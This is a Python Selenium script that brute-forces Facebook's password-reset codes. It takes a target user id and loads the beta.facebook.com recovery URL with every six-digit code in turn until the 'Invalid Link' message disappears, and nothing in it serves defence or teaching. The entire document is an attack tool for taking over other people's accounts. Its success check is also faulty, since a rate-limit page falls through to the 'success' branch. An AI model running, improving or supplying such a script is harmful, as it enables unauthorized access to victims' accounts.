from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import sys
br = webdriver.Firefox()
link1 = "http://uzbekweb.net"
try:
	id = sys.argv[1]
except:
	id = raw_input("Enter the id: ")



say = 100000
while say < 900000:
	link2 = "https://www.beta.facebook.com/recover/password?u=" + id + "&n=" + str(say)
	br.get(link2)
	kaynak = br.page_source
	if "Invalid Link" in kaynak:
		print "[!] unsuccess:", id, " ", say
	if "Please try again later" in kaynak:
		print "[?] No answer:", id, " ", say
	else:
		print "[+] success:",say
		break
	say += 1
